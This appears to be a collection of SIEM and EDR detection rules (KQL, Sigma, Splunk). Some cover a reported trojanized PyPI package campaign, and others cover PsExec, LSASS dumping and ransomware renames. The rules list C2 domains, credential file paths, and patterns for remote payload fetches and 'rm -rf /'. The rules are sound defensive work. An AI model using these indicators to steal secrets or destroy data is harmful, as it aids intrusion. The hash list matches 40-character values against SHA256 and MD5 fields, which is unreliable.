Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2017-7692")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2017-7692")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2017-7692")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2017-7692")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
Remote service execution — PsExec / SMB lateral movement Actions on Objectives High
psexec / paexec / smbexec / wmic /node — service install over SMB from remote host.
ATT&CKT1021.002 T1569.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
   or (FileName =~ "wmic.exe" and ProcessCommandLine has "/node:")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName

| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"
   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: PsExec / SMB Lateral Movement Tooling Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d03
status: experimental
description: |
    PsExec, paexec, smbexec, csexec, remcom — admin-grade tooling that
    pivots over SMB. Pair with `wmic /node:` for the full cluster.
references:
    - https://attack.mitre.org/techniques/T1021/002/
    - https://attack.mitre.org/techniques/T1569/002/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1021.002
    - attack.t1569.002
    - attack.lateral-movement
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_psexec:
        Image|endswith:
            - '\psexec.exe'
            - '\psexec64.exe'
            - '\psexesvc.exe'
            - '\paexec.exe'
            - '\csexec.exe'
            - '\remcom.exe'
            - '\smbexec.py'
    selection_wmic_remote:
        Image|endswith:
            - '\wmic.exe'
        CommandLine|contains:
            - '/node:'
    condition: selection_psexec or selection_wmic_remote
falsepositives:
    - Sysadmins running approved remote-management tooling — wrap with
      a known-admin-host watchlist
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("CB4E50433336707381429707F59C3CBE8D497D98", "1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7", "7DCFE9EE25841DFD58D3D6871BF867FE32141DFB", "77F1970D620216C5FFF4E14A6CCC13FCCC267217", "948159A7FC2E688386864BEA59FD40DFFC4B24D6", "A3C077BDF8898E612CCD65BC82E7960834ADB2A9") or SHA1 in~ ("CB4E50433336707381429707F59C3CBE8D497D98", "1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7", "7DCFE9EE25841DFD58D3D6871BF867FE32141DFB", "77F1970D620216C5FFF4E14A6CCC13FCCC267217", "948159A7FC2E688386864BEA59FD40DFFC4B24D6", "A3C077BDF8898E612CCD65BC82E7960834ADB2A9") or MD5 in~ ("CB4E50433336707381429707F59C3CBE8D497D98", "1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7", "7DCFE9EE25841DFD58D3D6871BF867FE32141DFB", "77F1970D620216C5FFF4E14A6CCC13FCCC267217", "948159A7FC2E688386864BEA59FD40DFFC4B24D6", "A3C077BDF8898E612CCD65BC82E7960834ADB2A9")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("CB4E50433336707381429707F59C3CBE8D497D98", "1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7", "7DCFE9EE25841DFD58D3D6871BF867FE32141DFB", "77F1970D620216C5FFF4E14A6CCC13FCCC267217", "948159A7FC2E688386864BEA59FD40DFFC4B24D6", "A3C077BDF8898E612CCD65BC82E7960834ADB2A9") or SHA1 in~ ("CB4E50433336707381429707F59C3CBE8D497D98", "1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7", "7DCFE9EE25841DFD58D3D6871BF867FE32141DFB", "77F1970D620216C5FFF4E14A6CCC13FCCC267217", "948159A7FC2E688386864BEA59FD40DFFC4B24D6", "A3C077BDF8898E612CCD65BC82E7960834ADB2A9") or MD5 in~ ("CB4E50433336707381429707F59C3CBE8D497D98", "1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7", "7DCFE9EE25841DFD58D3D6871BF867FE32141DFB", "77F1970D620216C5FFF4E14A6CCC13FCCC267217", "948159A7FC2E688386864BEA59FD40DFFC4B24D6", "A3C077BDF8898E612CCD65BC82E7960834ADB2A9")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["CB4E50433336707381429707F59C3CBE8D497D98", "1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7", "7DCFE9EE25841DFD58D3D6871BF867FE32141DFB", "77F1970D620216C5FFF4E14A6CCC13FCCC267217", "948159A7FC2E688386864BEA59FD40DFFC4B24D6", "A3C077BDF8898E612CCD65BC82E7960834ADB2A9"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

[LLM] Malicious durabletask PyPI package install (versions 1.4.1-1.4.3) Delivery High
Detects pip install of the trojanized Microsoft 'durabletask' Python package versions 1.4.1, 1.4.2 or 1.4.3 on developer workstations and CI/CD runners. These three versions embed the TeamPCP Mini Shai-Hulud dropper that auto-executes on package import. Rationale: Hard pivot on the article's three specific malicious package versions (durabletask 1.4.1, 1.4.2, 1.4.3) named verbatim in Wiz and Aikido reporting cited in the body. Catches both the install-time process exec and the resultant site-packages write — covering pip, poetry, uv and direct python interpreter invocations. The regex anchor `1\.4\.[123](\D|$)` prevents 1.4.10+ collateral.
ATT&CKT1195.002 T1204.002
Data sourcesEndpoint.Processes Endpoint.Filesystem
// Trojanized durabletask install — TeamPCP Mini Shai-Hulud
let bad_versions = dynamic(["durabletask==1.4.1","durabletask==1.4.2","durabletask==1.4.3","durabletask-1.4.1","durabletask-1.4.2","durabletask-1.4.3"]);
let ProcessHits = DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where FileName in~ ("pip","pip3","python","python3","poetry","uv")
    | where ProcessCommandLine has "durabletask"
    | where ProcessCommandLine matches regex @"durabletask[\s=<>~!\-_]+1\.4\.[123](\D|$)"
       or ProcessCommandLine has_any (bad_versions)
    | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, EvidenceType="ProcessExec";
let FileHits = DeviceFileEvents
    | where Timestamp > ago(30d)
    | where FolderPath has "site-packages"
    | where FolderPath matches regex @"durabletask[-_]1\.4\.[123]"
       or FileName matches regex @"durabletask[-_]1\.4\.[123]"
    | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, EvidenceType="FileWrite";
union ProcessHits, FileHits
| order by Timestamp desc
// Trojanized durabletask install — Sentinel ASIM
let bad_versions = dynamic(["durabletask==1.4.1","durabletask==1.4.2","durabletask==1.4.3"]);
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName has_any ("pip","pip3","python","python3","poetry","uv")
   or TargetProcessName has_any ("pip","pip3","python","python3")
| where ActingProcessCommandLine has "durabletask" or TargetProcessCommandLine has "durabletask"
| where (ActingProcessCommandLine matches regex @"durabletask[\s=<>~!\-_]+1\.4\.[123](\D|$)")
   or (TargetProcessCommandLine matches regex @"durabletask[\s=<>~!\-_]+1\.4\.[123](\D|$)")
   or ActingProcessCommandLine has_any (bad_versions)
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc
title: Malicious durabletask PyPI Package Install (Mini Shai-Hulud)
id: 7c9a3f2b-1d4e-4b6a-9c8e-2f5a8b7d3c01
description: Detects pip install of the trojanized Microsoft durabletask Python package versions 1.4.1, 1.4.2 or 1.4.3 distributed by TeamPCP as part of the Mini Shai-Hulud worm campaign.
references:
  - https://thehackernews.com/2026/05/grafana-github-breach-exposes-source.html
author: SOC Detection Engineering
date: 2026/05/20
tags:
  - attack.initial_access
  - attack.t1195.002
  - attack.execution
  - attack.t1204.002
logsource:
  category: process_creation
detection:
  selection_proc:
    Image|endswith:
      - '/pip'
      - '/pip3'
      - '/python'
      - '/python3'
      - '/poetry'
      - '/uv'
  selection_cmd:
    CommandLine|contains:
      - 'durabletask==1.4.1'
      - 'durabletask==1.4.2'
      - 'durabletask==1.4.3'
      - 'durabletask-1.4.1'
      - 'durabletask-1.4.2'
      - 'durabletask-1.4.3'
  condition: selection_proc and selection_cmd
falsepositives:
  - Intentional rollback by a developer who has not seen Microsoft's advisory
level: critical
source:linux.auditd @auditd.type:EXECVE (@process.command_line:(*durabletask==1.4.1* OR *durabletask==1.4.2* OR *durabletask==1.4.3* OR *durabletask-1.4.1* OR *durabletask-1.4.2* OR *durabletask-1.4.3*)) (@process.executable.path:(*/pip OR */pip3 OR */python OR */python3 OR */poetry OR */uv))
#event_simpleName=ProcessRollup2 ImageFileName=/(pip3?|python3?|poetry|uv)$/i | CommandLine=/durabletask[\s=<>~!\-_]+1\.4\.[123](\D|$)/i | groupBy([aid, ComputerName, UserName, CommandLine, ParentBaseFileName], function=count())

[LLM] Python interpreter fetches rope.pyz dropper from check.git-service.com Installation High
Catches the Mini Shai-Hulud second-stage download — a python process spawning curl/wget or making a direct outbound HTTPS call to check.git-service.com or fallback t.m-kosche.com to pull the rope.pyz payload, typically within seconds of the malicious durabletask import. Rationale: Pivots on three dedicated TeamPCP IOCs (check.git-service.com primary C2, t.m-kosche.com fallback, 83.142.209.194 — all named in Wiz, Aikido and StepSecurity reporting cited in the body) plus the unique payload filename rope.pyz. These domains have no legitimate use; any contact is high-fidelity.
ATT&CKT1105 T1059.006 T1071.001
Data sourcesNetwork_Traffic.All_Traffic Endpoint.Processes
// rope.pyz second-stage retrieval — TeamPCP C2 domains
let c2_domains = dynamic(["check.git-service.com","t.m-kosche.com"]);
let c2_ips = dynamic(["83.142.209.194"]);
let NetHits = DeviceNetworkEvents
    | where Timestamp > ago(30d)
    | where (RemoteUrl has_any (c2_domains)) or (RemoteIP in (c2_ips))
    | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, RemoteUrl, RemoteIP, RemotePort, EvidenceType="NetworkConnect";
let RopeFile = DeviceFileEvents
    | where Timestamp > ago(30d)
    | where FileName =~ "rope.pyz"
    | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName="", RemoteUrl=FileOriginUrl, RemoteIP=tostring(FileOriginIP), RemotePort=int(null), EvidenceType="FileDrop";
union NetHits, RopeFile
| order by Timestamp desc
// rope.pyz second-stage retrieval — Sentinel
let c2_domains = dynamic(["check.git-service.com","t.m-kosche.com"]);
let c2_ips = dynamic(["83.142.209.194"]);
union isfuzzy=true
  (ImDnsActivity
    | where TimeGenerated > ago(30d)
    | where DnsQuery has_any (c2_domains)
    | project TimeGenerated, DvcHostname, SrcHostname, SrcIpAddr, Indicator=DnsQuery, EvidenceType="DNS"),
  (ImNetworkSession
    | where TimeGenerated > ago(30d)
    | where DstHostname has_any (c2_domains) or DstIpAddr in (c2_ips)
    | project TimeGenerated, DvcHostname, SrcHostname, SrcIpAddr, Indicator=coalesce(DstHostname, DstIpAddr), EvidenceType="NetSession"),
  (ImWebSession
    | where TimeGenerated > ago(30d)
    | where Url has_any (c2_domains) or DstIpAddr in (c2_ips) or Url has "rope.pyz"
    | project TimeGenerated, DvcHostname, SrcHostname, SrcIpAddr, Indicator=Url, EvidenceType="WebSession")
| order by TimeGenerated desc

[LLM] Linux Python stealer harvesting cloud, vault, SSH and password-manager secrets Actions on Objectives High
Detects the rope.pyz infostealer's credential-harvest behaviour: a single python process reading multiple high-value secret paths on Linux (~/.aws/credentials, ~/.ssh/, ~/.docker/config.json, 1Password/Bitwarden vault files, ~/.vault-token, ~/.bash_history) within a short window after a recent pip install or rope.pyz drop. Rationale: SafeDep reverse-engineered the 28KB stealer and the article enumerates the exact target paths (HashiCorp Vault KV, 1Password, Bitwarden, SSH keys, Docker creds, VPN configs, shell history). The fan-out threshold of >=3 distinct cred paths inside 5 minutes by one python PID is what makes this article-specific rather than a generic 'python read .ssh' query.
ATT&CKT1552.001 T1552.004 T1555.005 T1528
Data sourcesEndpoint.Filesystem
// rope.pyz infostealer cred-harvest fan-out — Linux
let cred_globs = dynamic([
    "/.aws/credentials","/.aws/config",
    "/.ssh/id_rsa","/.ssh/id_ed25519","/.ssh/id_ecdsa","/.ssh/known_hosts",
    "/.docker/config.json","/.dockercfg",
    "/.bash_history","/.zsh_history",
    "/.vault-token",
    "/.config/op","/.config/1Password","/.config/Bitwarden",
    "/.netrc","/.kube/config"
]);
DeviceFileEvents
| where Timestamp > ago(7d)
| where DeviceName in ((DeviceInfo | where OSPlatform in ("Linux","linux") | distinct DeviceName))
   or InitiatingProcessFolderPath startswith "/"
| where InitiatingProcessFileName in~ ("python","python3")
| where ActionType in ("FileAccessed","FileCreated","FileModified","FileRenamed")
| extend FullPath = strcat(FolderPath, "/", FileName)
| where FullPath has_any (cred_globs)
| summarize PathsTouched = make_set(FullPath, 50), DistinctPaths = dcount(FullPath), Count = count(), FirstSeen=min(Timestamp), LastSeen=max(Timestamp)
          by DeviceName, InitiatingProcessId, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessAccountName, bin(Timestamp, 5m)
| where DistinctPaths >= 3
| order by LastSeen desc

[LLM] Mini Shai-Hulud worm propagation via AWS SSM SendCommand fan-out Actions on Objectives High
Detects the worm's cloud lateral movement: a single IAM principal issuing ssm:SendCommand with the AWS-RunShellScript document to multiple EC2 instances in a short window, fetching the rope.pyz payload. The article quotes StepSecurity that propagation hits up to 5 EC2 instances per profile. Rationale: Locks onto two article-specific signals StepSecurity reported: (1) the worm uses `ssm:SendCommand` with `documentName=AWS-RunShellScript`, (2) the script body downloads rope.pyz from the named C2 domains. The >=3-instance threshold matches the 'up to 5 EC2 instances per profile' quote while still catching smaller propagation bursts.
ATT&CKT1021.007 T1651 T1078.004
Data sourcesAuthentication Change
// Mini Shai-Hulud SSM SendCommand fan-out — uses AWSCloudTrail connector
// Note: AWSCloudTrail is not in this prompt's listed schema; if not connected, use Datadog query instead
AWSCloudTrail
| where TimeGenerated > ago(7d)
| where EventName == "SendCommand" and EventSource == "ssm.amazonaws.com"
| extend doc = tostring(parse_json(RequestParameters).documentName)
| extend cmds = tostring(parse_json(RequestParameters).parameters.commands)
| extend instanceIds = parse_json(tostring(parse_json(RequestParameters).instanceIds))
| where doc == "AWS-RunShellScript"
| where cmds has_any ("rope.pyz","check.git-service.com","t.m-kosche.com","83.142.209.194")
   or cmds matches regex @"(curl|wget)\s+(-[a-zA-Z]+\s+)*https?://[^\s]+\.(pyz|py)\b"
| summarize InstanceCount = dcountif(tostring(instanceIds), isnotempty(tostring(instanceIds))), Cmds = make_set(cmds, 5), SrcIPs = make_set(SourceIpAddress, 5), FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated)
         by UserIdentityArn, UserIdentityUserName, UserIdentityAccessKeyId
| where InstanceCount >= 3
| order by LastSeen desc
source:cloudtrail @evt.name:SendCommand @evt.outcome:success @requestParameters.documentName:AWS-RunShellScript (@requestParameters.parameters.commands:(*rope.pyz* OR *check.git-service.com* OR *t.m-kosche.com* OR *83.142.209.194* OR *curl* OR *wget*))
CLOUD
`cloudtrail` eventName=SendCommand eventSource=ssm.amazonaws.com requestParameters.documentName=AWS-RunShellScript (requestParameters.parameters.commands{}="*rope.pyz*" OR requestParameters.parameters.commands{}="*check.git-service.com*" OR requestParameters.parameters.commands{}="*t.m-kosche.com*" OR requestParameters.parameters.commands{}="*curl*") | stats min(_time) as firstTime max(_time) as lastTime dc(requestParameters.instanceIds{}) as instance_count values(requestParameters.instanceIds{}) as instances values(sourceIPAddress) as srcIPs by userIdentity.arn userIdentity.userName userIdentity.accessKeyId | where instance_count>=3 | convert ctime(firstTime) ctime(lastTime)
[LLM] FIRESCALE backup-C2 lookup via GitHub commit-message search Command & Control High
Detects the FIRESCALE dead-drop fallback technique: outbound HTTPS to api.github.com/search/commits with the literal pattern 'FIRESCALE' in the query string, used by the worm to recover a base64-encoded backup C2 address when the primary domain is sinkholed. Rationale: FIRESCALE is a unique string from the article (originally documented by Hunt.io) that the worm uses to scrape backup C2 from GitHub public commit messages. The literal token 'FIRESCALE' has essentially zero benign use, making this an extremely low-FP signal. We pivot on both the URL containing FIRESCALE and processes (curl/python/wget) querying api.github.com with that string in args.
ATT&CKT1102.001 T1568 T1071.001
Data sourcesWeb.Web Network_Traffic.All_Traffic
// FIRESCALE dead-drop resolver — GitHub commit-search query
let PrimaryUrlHit = DeviceNetworkEvents
    | where Timestamp > ago(30d)
    | where RemoteUrl has "api.github.com"
    | where RemoteUrl has "FIRESCALE" or RemoteUrl has "search/commits"
    | where RemoteUrl has "FIRESCALE"
    | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, EvidenceType="NetEvent";
let CmdHit = DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where ProcessCommandLine has "api.github.com"
    | where ProcessCommandLine has "FIRESCALE" or (ProcessCommandLine has "search/commits" and ProcessCommandLine has_any ("q=","FIRESCALE"))
    | project Timestamp, DeviceName, InitiatingProcessFileName=FileName, InitiatingProcessCommandLine=ProcessCommandLine, RemoteUrl="", RemoteIP="", EvidenceType="Process";
union PrimaryUrlHit, CmdHit
| order by Timestamp desc
// FIRESCALE dead-drop resolver — Sentinel ASIM
union isfuzzy=true
  (ImWebSession
    | where TimeGenerated > ago(30d)
    | where Url has "api.github.com"
    | where Url has "FIRESCALE"
    | project TimeGenerated, DvcHostname, SrcHostname, SrcUsername, Indicator=Url, EvidenceType="Web"),
  (ImProcessCreate
    | where TimeGenerated > ago(30d)
    | where ActingProcessCommandLine has "api.github.com"
    | where ActingProcessCommandLine has "FIRESCALE"
    | project TimeGenerated, DvcHostname, SrcHostname="", SrcUsername=ActorUsername, Indicator=ActingProcessCommandLine, EvidenceType="Process")
| order by TimeGenerated desc

[LLM] Locale-gated destructive payload: python parent spawns rm -rf / on Linux Actions on Objectives High
Catches the Mini Shai-Hulud destructive branch: a Python interpreter spawning rm -rf with a root-of-tree target on Linux, optionally preceded by locale checks for Israeli (he_IL) or Iranian (fa_IR) settings and audio playback (aplay/paplay/mpg123) — the 1-in-6 destructive behaviour Aikido documented. Rationale: The article quotes Aikido on the exact destructive condition: locale-detect for Israeli/Iranian settings, 1-in-6 probability, audio playback then `rm -rf /*`. We anchor on the python parent (excludes admin manual rm -rf which would have a shell parent), the regex normalises -rf / -fr / --no-preserve-root flag orderings, and pairs locale and audio signals (paplay/aplay/mpg123) as supporting evidence — none of which are routine on a build host.
ATT&CKT1485 T1657 T1059.004
Data sourcesEndpoint.Processes
// Locale-gated destructive payload — python -> rm -rf /
let RmHits = DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where InitiatingProcessFileName in~ ("python","python3")
    | where FileName in~ ("rm","sh","bash","dash","zsh")
    | where ProcessCommandLine matches regex @"\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*|-[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*)(\s+--no-preserve-root)?\s+(/(\s|$|\*)|/\*)"
    | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessParentFileName, EvidenceType="rm_rf";
let AudioHits = DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where InitiatingProcessFileName in~ ("python","python3")
    | where FileName in~ ("aplay","paplay","mpg123","ffplay","play")
    | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessParentFileName, EvidenceType="audio_taunt";
let LocaleHits = DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where InitiatingProcessFileName in~ ("python","python3")
    | where ProcessCommandLine has_any ("he_IL","fa_IR","LANG=he","LANG=fa","locale -a","localectl")
    | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessParentFileName, EvidenceType="locale_check";
union RmHits, AudioHits, LocaleHits
| order by Timestamp desc
// Locale-gated destructive payload — Sentinel ASIM
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName has_any ("python","python3") or ParentProcessName has_any ("python","python3")
| where (TargetProcessName has_any ("rm","sh","bash","dash","zsh")
     and (TargetProcessCommandLine matches regex @"\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*|-[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*)(\s+--no-preserve-root)?\s+(/(\s|$|\*)|/\*)"))
   or TargetProcessName has_any ("aplay","paplay","mpg123","ffplay")
   or TargetProcessCommandLine has_any ("he_IL","fa_IR","LANG=he","LANG=fa")
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine, ActingProcessName, ActingProcessCommandLine, ParentProcessName
| order by TimeGenerated desc

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name IN ("python","python3") AND (Processes.process_name IN ("rm","sh","bash","dash")) AND (Processes.process="*rm * -rf */*" OR Processes.process="*rm -rf /" OR Processes.process="*rm -rf /*" OR Processes.process="*--no-preserve-root*") by Processes.dest Processes.user Processes.process Processes.parent_process Processes.parent_process_name | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)
Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

title: LSASS Process Access Outside Microsoft-Signed Tooling
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d04
status: experimental
description: |
    Anything opening lsass.exe with read-memory access that isn't a
    Microsoft signed component (Defender, csrss, etc.) is suspect.
    Mimikatz / Pypykatz / nanodump signature.
references:
    - https://attack.mitre.org/techniques/T1003/001/
